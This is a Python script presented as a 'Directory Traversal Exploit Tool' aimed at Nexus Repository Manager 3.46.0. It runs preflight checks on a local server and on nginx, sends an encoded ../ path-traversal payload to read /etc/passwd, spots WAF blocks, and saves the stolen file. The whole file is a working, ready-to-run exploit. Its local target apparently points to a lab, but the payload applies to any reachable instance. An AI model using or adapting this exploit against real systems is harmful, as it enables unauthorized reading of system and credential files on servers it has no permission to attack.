import requests
import os
import re
from colorama import init, Fore, Style
from art import text2art
from bs4 import BeautifulSoup

# Initialize colorama
init(autoreset=True)

BASE_URL = "http://localhost:8081"
TARGET_FILE = "/etc/passwd"
HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3'}

def print_header():
    header = text2art("Zenrho", font="block")
    print(Fore.CYAN + Style.BRIGHT + header)
    print(Fore.YELLOW + "Directory Traversal Exploit Tool" + Style.RESET_ALL)
    print(Fore.MAGENTA + "=" * 50 + Style.RESET_ALL + "\n")

def check_server_live():
    try:
        response = requests.get(BASE_URL, headers=HEADERS, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + "[+] Server is live and responding.")
            return True
        else:
            print(Fore.RED + f"[-] Server is responding with status code: {response.status_code}")
            return False
    except requests.RequestException:
        print(Fore.RED + "[-] Failed to connect to the server. Make sure it's running and accessible.")
        return False

def check_server_version():
    try:
        response = requests.get(BASE_URL, headers=HEADERS)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            version_element = soup.find('span', {'id': 'version'})
            if version_element:
                version = version_element.text.strip()
                print(Fore.GREEN + f"[+] Nexus Repository Manager version: {version}")
                return version
            else:
                print(Fore.YELLOW + "[-] Unable to find version information in the HTML.")
                return None
        else:
            print(Fore.YELLOW + "[-] Unable to retrieve the Nexus homepage.")
            return None
    except requests.RequestException:
        print(Fore.YELLOW + "[-] Failed to retrieve server version.")
        return None

def check_nginx():
    try:
        response = requests.get("http://localhost", headers=HEADERS)
        server = response.headers.get('Server', '')
        if 'nginx' in server.lower():
            print(Fore.GREEN + f"[+] Nginx is running: {server}")
        else:
            print(Fore.YELLOW + "[-] Nginx doesn't seem to be running on port 80.")
    except requests.RequestException:
        print(Fore.YELLOW + "[-] Failed to check Nginx status.")

def exploit_directory_traversal():
    encoded_file_path = TARGET_FILE.replace("/", "%2F")
    payload = f"/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..{encoded_file_path}"
    url = f"{BASE_URL}{payload}"
    
    try:
        print(Fore.BLUE + f"[*] Attempting to access: {TARGET_FILE}")

        response = requests.get(url, headers=HEADERS, verify=False)
        
        if response.status_code == 200:
            if "Request Rejected" in response.text:
                print(Fore.RED + f"[-] WAF blocked request for {TARGET_FILE}!")
            else:
                print(Fore.GREEN + f"[+] Successfully accessed: {TARGET_FILE}!")
                save_output(TARGET_FILE, response.text)
        elif response.status_code == 404:
            print(Fore.YELLOW + f"[-] File {TARGET_FILE} does not exist!")
        else:
            print(Fore.RED + f"[-] Failed to access: {TARGET_FILE}! Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")

def save_output(file_path, content):
    if not os.path.exists("output"):
        os.makedirs("output")
    safe_filename = file_path.replace('/', '_')
    with open(f"output/{safe_filename}", 'w', encoding='utf-8') as file:
        file.write(content)
    print(Fore.GREEN + f"[+] Saved response to output/{safe_filename}!")

def main():
    print_header()
    
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        print(Fore.CYAN + "Performing preflight checks...")
        if not check_server_live():
            return

        server_version = check_server_version()
        if server_version:
            expected_version = "3.46.0"
            if server_version != expected_version:
                print(Fore.YELLOW + f"[!] Warning: Server version ({server_version}) doesn't match expected version ({expected_version})")

        check_nginx()

        print(Fore.CYAN + "\nPreflight checks completed. Starting exploit...\n")
        exploit_directory_traversal()
    
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")

if __name__ == "__main__":
    main()